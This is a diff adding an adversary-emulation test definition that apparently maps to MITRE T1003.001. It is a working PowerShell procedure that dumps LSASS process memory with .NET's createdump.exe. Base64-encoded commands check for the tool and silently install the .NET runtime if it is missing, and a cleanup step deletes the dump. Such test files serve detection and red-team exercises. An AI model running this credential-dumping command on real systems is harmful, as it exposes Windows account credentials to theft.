@@ -1,0 +1,22 @@
+- id: c5654e2e-2815-5c10-a20e-59ea705a6b1c
+  name: Soumaia ART Tests - Dump LSASS with createdump.exe from .Net v5
+  description: 'Use createdump executable from .NET to create an LSASS dump.
+
+
+    [Reference](https://twitter.com/bopin2020/status/1366400799199272960?s=20) (requires elevation)'
+  tactic: credential-access
+  technique:
+    attack_id: T1003.001
+    name: 'OS Credential Dumping: LSASS Memory'
+  platforms:
+    windows:
+      psh:
+        command: |-
+          powershell -NoProfile -EncodedCommand JABlAHgAZQBQAGEAdABoACAAPQAgACAAcgBlAHMAbwBsAHYAZQAtAHAAYQB0AGgAIAAiACQAZQBuAHYAOgBQAHIAbwBnAHIAYQBtAEYAaQBsAGUAcwBcAGQAbwB0AG4AZQB0AFwAcwBoAGEAcgBlAGQAXABNAGkAYwByAG8AcwBvAGYAdAAuAE4ARQBUAEMAbwByAGUALgBBAHAAcABcADUAKgBcAGMAcgBlAGEAdABlAGQAdQBtAHAALgBlAHgAZQAiAAoAaQBmACAAKAAkAGUAeABlAFAAYQB0AGgAIAAtAGEAbgBkACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACQAZQB4AGUAUABhAHQAaAApACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA
+          if ($LASTEXITCODE -ne 0) {
+              powershell -NoProfile -EncodedCommand dwBpAG4AZwBlAHQAIABpAG4AcwB0AGEAbABsACAATQBpAGMAcgBvAHMAbwBmAHQALgBEAG8AdABOAGUAdAAuAEQAZQBzAGsAdABvAHAAUgB1AG4AdABpAG0AZQAuADUAIAAtAC0AYQBjAGMAZQBwAHQALQBzAG8AdQByAGMAZQAtAGEAZwByAGUAZQBtAGUAbgB0AHMAIAAtAC0AYQBjAGMAZQBwAHQALQBwAGEAYwBrAGEAZwBlAC0AYQBnAHIAZQBlAG0AZQBuAHQAcwAgAC0ALQBzAGkAbABlAG4AdAAKAA==
+          }
+          $exePath =  resolve-path "$env:ProgramFiles\dotnet\shared\Microsoft.NETCore.App\5*\createdump.exe"
+          & "$exePath" -u -f $env:Temp\dotnet-lsass.dmp (Get-Process lsass).id
+        cleanup: |-
+          Remove-Item $env:Temp\dotnet-lsass.dmp -ErrorAction Ignore
